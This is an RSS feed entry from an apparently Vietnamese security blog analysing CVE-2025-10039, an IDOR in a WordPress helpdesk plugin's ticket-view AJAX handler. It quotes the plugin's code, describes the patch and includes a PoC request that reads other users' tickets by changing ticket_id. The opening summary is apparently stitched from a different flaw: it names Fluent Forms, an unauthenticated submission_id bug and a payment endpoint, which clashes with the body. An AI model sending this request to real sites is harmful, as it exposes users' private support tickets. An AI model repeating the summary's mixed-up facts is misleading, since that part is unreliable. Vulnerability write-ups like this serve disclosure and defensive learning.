      <pubDate>Sun, 28 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-28-cve-2025-10039/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Fluent Forms – Customizable Contact Forms, Survey, Quiz, &amp;amp; Conversational Form Builder&lt;/strong&gt; tồn tại &lt;strong&gt;lỗ hổng Insecure Direct Object Reference (IDOR)&lt;/strong&gt; trong tất cả các phiên bản &lt;strong&gt;≤ 3.2.9&lt;/strong&gt; thông qua tham số &lt;code&gt;submission_id&lt;/code&gt; trong endpoint xác nhận thanh toán SCA.&#xA;Lỗ hổng cho phép &lt;strong&gt;người dùng chưa xác thực&lt;/strong&gt; có thể &lt;strong&gt;đánh dấu submission của người khác là failed&lt;/strong&gt;, gây gián đoạn quá trình thanh toán.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10039&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10039&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.2.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.3.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/elex-helpdesk-customer-support-ticket-system/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ELEX WordPress HelpDesk &amp;amp; Customer Ticketing System Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;ELEX WordPress HelpDesk &amp;amp; Customer Ticketing System&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.2.9&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.3.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đăng ký AJAX handler &lt;strong&gt;cho người dùng đã đăng nhập&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_eh_crm_ticket_single_view_client&amp;#39;, array( &amp;#39;CRM_Ajax&amp;#39;, &amp;#39;eh_crm_ticket_single_view_client&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; là hook dành cho người dùng đã đăng nhập (Subcriber+). Khi có request tới endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=eh_crm_ticket_single_view_client&lt;/code&gt; thì callback &lt;code&gt;eh_crm_ticket_single_view_client&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function eh_crm_ticket_single_view_client() {&#xA;    if ( wp_verify_nonce( isset( $_POST[&amp;#39;nonce&amp;#39;] ) ? sanitize_text_field( $_POST[&amp;#39;nonce&amp;#39;] ) : &amp;#39;&amp;#39;, &amp;#39;wsdesk_nonce&amp;#39; ) ) {&#xA;        $ticket_id = isset( $_POST[&amp;#39;ticket_id&amp;#39;] ) ? sanitize_text_field( $_POST[&amp;#39;ticket_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $content   = self::eh_crm_ticket_single_view_client_gen( $ticket_id );&#xA;        wp_send_json_success( array( &amp;#39;page&amp;#39; =&amp;gt; $content ) );&#xA;        die;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm thực hiện kiểm tra &lt;code&gt;nonce&lt;/code&gt; giúp chống CSRF&lt;/p&gt;&#xA;&lt;p&gt;Sau đó lấy &lt;code&gt;ticket_id&lt;/code&gt; từ request, gọi hàm &lt;code&gt;eh_crm_ticket_single_view_client_gen()&lt;/code&gt; xử lý, lấy nội dung của ticket tương ứng với &lt;code&gt;ticker_id&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Cuối cùng trả về nội dung dạng JSON.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function eh_crm_ticket_single_view_client_gen( $ticket_id ) {&#xA;&#xA;    // Lấy dữ liệu ticket dựa trên ticket_id do user truyền vào&#xA;    $current      = eh_crm_get_ticket( array( &amp;#39;ticket_id&amp;#39; =&amp;gt; $ticket_id ) );&#xA;    $current_meta = eh_crm_get_ticketmeta( $ticket_id );&#xA;&#xA;    // Lấy thông tin người dùng nội bộ (agent/admin)&#xA;    $users_data = get_users( array(&#xA;        &amp;#39;role__in&amp;#39; =&amp;gt; array( &amp;#39;administrator&amp;#39;, &amp;#39;WSDesk_Agents&amp;#39;, &amp;#39;WSDesk_Supervisor&amp;#39; )&#xA;    ));&#xA;&#xA;    ...&#xA;&#xA;    // Render nội dung ticket (HTML output)&#xA;    echo esc_html( $current[0][&amp;#39;ticket_title&amp;#39;] );&#xA;    echo esc_html( $current[0][&amp;#39;ticket_email&amp;#39;] );&#xA;    echo esc_html( $current[0][&amp;#39;ticket_date&amp;#39;] );&#xA;&#xA;    ...&#xA;&#xA;    // Hiển thị nội dung hội thoại, file đính kèm, metadata&#xA;    self::eh_crm_ticket_reply_section_gen_client( $ticket_id );&#xA;&#xA;    ...&#xA;&#xA;    return ob_get_clean();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;eh_crm_ticket_single_view_client_gen&lt;/code&gt; và &lt;code&gt;eh_crm_get_ticketmeta&lt;/code&gt; được gọi để truy xuất dữ liệu của ticket:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function eh_crm_get_ticket( $args, $fields = null ) {&#xA;&#x9;set_time_limit( 300 );&#xA;&#x9;$query = wpFluent()-&amp;gt;table( tables: &amp;#39;wsdesk_tickets&amp;#39; )-&amp;gt;where( &amp;#39;ticket_trash&amp;#39;, 0 );&#xA;&#xA;&#x9;if ( null !== $fields ) {&#xA;&#x9;&#x9;$fields = is_array( $fields ) ? $fields : array( $fields );&#xA;&#x9;&#x9;foreach ( $fields as $field ) {&#xA;&#x9;&#x9;&#x9;$query-&amp;gt;select( $field );&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;if ( is_array( $args ) ) {&#xA;&#x9;&#x9;foreach ( $args as $key =&amp;gt; $value ) {&#xA;&#x9;&#x9;&#x9;$allowed_fileds = array( &amp;#39;ticket_id&amp;#39;, &amp;#39;ticket_author&amp;#39;, &amp;#39;ticket_email&amp;#39;, &amp;#39;ticket_date&amp;#39;, &amp;#39;ticket_title&amp;#39;, &amp;#39;ticket_parent&amp;#39;, &amp;#39;ticket_category&amp;#39;, &amp;#39;ticket_vendor&amp;#39;, &amp;#39;ticket_trash&amp;#39; );&#xA;&#x9;&#x9;&#x9;if ( in_array( $key, $allowed_fileds, true ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$query-&amp;gt;where( $key, $value );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;$ticket = (array) $query-&amp;gt;first();&#xA;&#xA;&#x9;if ( ! $ticket ) {&#xA;&#x9;&#x9;return false;&#xA;&#x9;}&#xA;&#xA;&#x9;if ( isset( $ticket[&amp;#39;ticket_content&amp;#39;] ) ) {&#xA;&#x9;&#x9;$ticket[&amp;#39;ticket_content&amp;#39;] = wp_kses_post( $ticket[&amp;#39;ticket_content&amp;#39;] );&#xA;&#x9;}&#xA;&#xA;&#x9;return array( $ticket );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;function eh_crm_get_ticketmeta( $id, $key = null ) {&#xA;&#x9;set_time_limit( 300 );&#xA;&#x9;global $wpdb;&#xA;&#x9;$data     = $wpdb-&amp;gt;get_results( $wpdb-&amp;gt;prepare( &amp;#39;SELECT meta_key,meta_value FROM &amp;#39; . $wpdb-&amp;gt;prefix . &amp;#39;wsdesk_ticketsmeta WHERE ticket_id = %d&amp;#39;, (int) $id ), ARRAY_A );&#xA;&#x9;$retrived = array();&#xA;&#x9;if ( null !== $key ) {&#xA;&#x9;&#x9;$data = $wpdb-&amp;gt;get_results( $wpdb-&amp;gt;prepare( &amp;#39;SELECT meta_key,meta_value FROM &amp;#39; . $wpdb-&amp;gt;prefix . &amp;#39;wsdesk_ticketsmeta WHERE ticket_id = %d AND meta_key = %s&amp;#39;, (int) $id, $key ), ARRAY_A );&#xA;&#x9;}&#xA;&#x9;if ( ! $data ) {&#xA;&#x9;&#x9;return false;&#xA;&#x9;}&#xA;&#x9;if ( null !== $key ) {&#xA;&#x9;&#x9;return maybe_unserialize( $data[0][&amp;#39;meta_value&amp;#39;] );&#xA;&#x9;}&#xA;&#x9;for ( $i = 0; $i &amp;lt; count( $data ); $i&amp;#43;&amp;#43; ) {&#xA;&#x9;&#x9;$retrived[ $data[ $i ][&amp;#39;meta_key&amp;#39;] ] = maybe_unserialize( $data[ $i ][&amp;#39;meta_value&amp;#39;] );&#xA;&#x9;}&#xA;&#x9;return maybe_unserialize( $retrived );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Không có bất kỳ kiểm tra nào để xác nhận người dùng hiện tại có phải là chủ sở hữu ticket hay không, có quyền xem ticket này hay không =&amp;gt; IDOR&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Bản vá v3.3.0&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/diff.png&#34; title=&#34;Bản vá v3.3.0&#34; data-thumbnail=&#34;/posts/2025-12-28-cve-2025-10039/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Bản vá v3.3.0&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-28-cve-2025-10039/diff.png&#39; alt=&#34;Patch&#34; height=&#34;693&#34; width=&#34;1888&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bản vá v3.3.0&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã &lt;strong&gt;ngăn chặn IDOR bằng cách ràng buộc quyền truy cập theo người dùng&lt;/strong&gt;, cụ thể:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;So sánh &lt;code&gt;ticket_author&lt;/code&gt; với &lt;code&gt;current_user_id&lt;/code&gt; để đảm bảo người xem là chủ sở hữu ticket&lt;/li&gt;&#xA;&lt;li&gt;Chỉ cho phép truy cập nếu người dùng thuộc nhóm được cấp quyền (&lt;code&gt;administrator&lt;/code&gt;, &lt;code&gt;WSDesk_Agents&lt;/code&gt;, &lt;code&gt;WSDesk_Supervisor&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;li&gt;Từ chối mọi truy cập không hợp lệ trước khi trả dữ liệu&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Nhờ đó, không thể truy cập ticket của người khác chỉ bằng cách thay đổi &lt;code&gt;ticket_id&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated User (Subcriber&amp;#43;)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Request admin-ajax.php?action=eh_crm_ticket_single_view_client&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Verify nonce&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Get ticket_id from request&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Load ticket by ticket_id&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;No ownership check&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;No role validation&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;Return full ticket data&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;User can view other users&amp;#39; tickets (IDOR)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login với Subcriber+ user:&lt;/li&gt;&#xA;&lt;li&gt;Submit 1 ticket bất kì&lt;/li&gt;&#xA;&lt;li&gt;Tại bảng &lt;code&gt;Your Tickets&lt;/code&gt;, lấy &lt;code&gt;nonce&lt;/code&gt; bằng cách view source:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/nonce.png&#34; title=&#34;Lấy nonce&#34; data-thumbnail=&#34;/posts/2025-12-28-cve-2025-10039/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Lấy nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-28-cve-2025-10039/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;513&#34; width=&#34;1346&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Lấy nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Gửi request với &lt;code&gt;nonce&lt;/code&gt; vừa lấy được&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: Subcriber&amp;#43; cookie&#xA;&#xA;action=eh_crm_ticket_single_view_client&amp;amp;nonce=4de88a7186&amp;amp;ticket_id=any_ticket_id &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-28-cve-2025-10039/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-28-cve-2025-10039/result.png&#39; alt=&#34;Result&#34; height=&#34;910&#34; width=&#34;1555&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thông tin trả về chứa nội dung của ticket và cả thông tin author của ticket&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xảy ra do endpoint &lt;code&gt;eh_crm_ticket_single_view_client&lt;/code&gt; &lt;strong&gt;không kiểm tra quyền sở hữu ticket&lt;/strong&gt;, chỉ dựa vào &lt;code&gt;ticket_id&lt;/code&gt; do người dùng cung cấp.&#xA;Điều này cho phép bất kỳ người dùng đã đăng nhập nào truy cập ticket của người khác → &lt;strong&gt;IDOR&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá khắc phục bằng cách:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;So sánh &lt;code&gt;ticket_author&lt;/code&gt; với &lt;code&gt;current_user_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Chỉ cho phép các role được cấp quyền truy cập&lt;/li&gt;&#xA;&lt;li&gt;Từ chối request nếu không hợp lệ trước khi trả dữ liệu&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;nonce&lt;/code&gt; &lt;strong&gt;không thay thế cho kiểm tra phân quyền&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Không được tin dữ liệu ID do client gửi lên&lt;/li&gt;&#xA;&lt;li&gt;Luôn kiểm tra &lt;strong&gt;ownership&lt;/strong&gt; trước khi truy xuất dữ liệu&lt;/li&gt;&#xA;&lt;li&gt;Authorization phải được xử lý ở backend, trước khi trả response&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 